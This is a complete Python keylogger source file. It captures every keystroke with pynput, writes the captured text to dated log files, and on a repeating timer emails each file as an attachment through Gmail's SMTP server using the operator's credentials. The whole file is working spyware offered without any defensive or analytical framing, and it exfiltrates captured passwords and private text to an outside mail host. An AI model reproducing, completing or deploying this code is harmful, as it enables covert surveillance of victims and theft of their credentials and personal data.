import pynput.keyboard
import threading
import smtplib
from datetime import date
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

log=""

class Keylogger:
    z = datetime.now()
    m = "keylogger_fecha_{}.txt".format(z.strftime("%d-%m-%Y_%H-%M"))

    def __init__(self, time_interval, email, password):
        self.log=""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log=self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key= " " + str(key) + " " 
        self.append_to_log(current_key)

    def report(self):
        #print(self.log)
        #self.send_mail(self.email, self.password, self.log)
        self.crearTXT(self.log)
        self.sendmailwithtxt(self.email, self.password)
        self.log=""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def crearTXT(self,captexto):
        archivo = open(self.m,"w+")
        archivo.write(captexto)
        archivo.close()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    
    def sendmailwithtxt(self, email, password):
        mensaje = MIMEMultipart("plain")
        mensaje["From"] = email
        mensaje["To"]= email
        mensaje["Subject"] = "Keylogger"
        adjunto = MIMEBase("application", "octect-stream")
        adjunto.set_payload(open(self.m,"rb").read())
        adjunto.add_header("content-Disposition",'attachment; filename={}'.format(self.m))
        mensaje.attach(adjunto)
        smtp = smtplib.SMTP("smtp.gmail.com", 587)
        smtp.starttls()
        smtp.login(email, password)
        smtp.sendmail(email, email, mensaje.as_string())
        smtp.quit()
